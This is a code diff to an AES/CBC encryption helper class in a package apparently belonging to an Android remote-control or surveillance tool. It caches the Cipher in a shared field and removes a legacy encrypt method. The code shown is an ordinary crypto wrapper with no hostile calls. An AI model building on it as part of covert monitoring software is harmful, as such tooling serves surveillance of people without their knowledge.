@@ -8,7 +8,10 @@
  * *******************************************/
 package com.ht.RCSAndroidGUI.crypto;
 
+import java.security.NoSuchAlgorithmException;
+
 import javax.crypto.Cipher;
+import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
@@ -36,13 +39,17 @@ public class Crypto {
 	
 	/** The iv spec. */
 	private final IvParameterSpec ivSpec;
+	
+	Cipher cipher;
 
 	/**
 	 * Instantiates a new crypto.
 	 *
 	 * @param key the key
+	 * @throws NoSuchPaddingException 
+	 * @throws NoSuchAlgorithmException 
 	 */
-	public Crypto(final byte[] key) {
+	public Crypto(final byte[] key) throws NoSuchAlgorithmException, NoSuchPaddingException {
 		aes_key = new byte[key.length];
 		System.arraycopy(key, 0, aes_key, 0, key.length);
 		skey_spec = new SecretKeySpec(aes_key, "AES");
@@ -54,6 +61,8 @@ public class Crypto {
 		}
 
 		ivSpec = new IvParameterSpec(iv);
+		
+		cipher= Cipher.getInstance("AES/CBC/NoPadding");
 	}
 
 	/**
@@ -64,7 +73,7 @@ public class Crypto {
 	 * @throws Exception the exception
 	 */
 	public byte[] encrypt(final byte[] clear) throws Exception {
-		final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
+		
 		cipher.init(Cipher.ENCRYPT_MODE, skey_spec, ivSpec);
 		final byte[] encrypted = cipher.doFinal(clear);
 		return encrypted;
@@ -78,7 +87,7 @@ public class Crypto {
 	 * @throws Exception the exception
 	 */
 	public byte[] decrypt(final byte[] encrypted) throws Exception {
-		final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
+		//final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
 		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
 		final byte[] decrypted = cipher.doFinal(encrypted);
 		return decrypted;
@@ -98,7 +107,7 @@ public class Crypto {
 			return null;
 		}
 
-		final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
+		//final Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
 		cipher.init(Cipher.DECRYPT_MODE, skey_spec, ivSpec);
 
 		if (offset == 0) {
@@ -132,24 +141,4 @@ public class Crypto {
 
 	}
 
-	// COMPAT
-	/**
-	 * Encrypt.
-	 *
-	 * @param plain the plain
-	 * @param cypher the cypher
-	 */
-	public void encrypt(final byte[] plain, final byte[] cypher) {
-		try {
-			final byte[] buffer = encrypt(plain);
-			Check.asserts(plain.length == buffer.length,
-					"different size buffers");
-
-			System.arraycopy(buffer, 0, cypher, 0, buffer.length);
-			
-		} catch (final Exception e) {
-			Log.e(TAG, e.toString());
-		}
-
-	}
 }
